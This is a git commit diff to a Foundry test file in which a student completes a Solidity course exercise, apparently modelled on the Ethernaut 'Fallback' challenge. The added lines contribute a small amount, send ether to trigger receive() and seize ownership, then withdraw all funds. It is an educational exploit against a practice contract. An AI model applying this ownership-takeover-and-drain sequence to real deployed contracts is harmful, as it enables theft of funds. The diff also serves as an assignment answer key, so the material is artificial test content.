0f49499e7a417ddab4c8f752f055527527b80f5d
shakershakshak <shakershakshak@gmail.com>
2025-08-25 03:58:53 +0200

    Assmignment11

--- test/Assignment11.sol
+++ test/Assignment11.sol
@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-import "forge-std/Test.sol";
+import "../lib/forge-std/src/Test.sol";
 import "../src/Assignment11.sol";
 
 contract FallbackTest is Test {
@@ -18,10 +18,13 @@ contract FallbackTest is Test {
         vm.startPrank(student);
         
         // Contribute a small amount (less than 0.001 ether) to the contract
+       fallbackContract.contribute{value: 0.0001 ether}();
 
         // Send ether to the contract trigger receive() and become the owner
-
+        (bool success, ) = address(fallbackContract).call{value: 0.0001 ether}("");
+        require(success, "Failed to send ether");
         // Withdraw all funds
+        fallbackContract.withdraw();
 
         vm.stopPrank();
     }
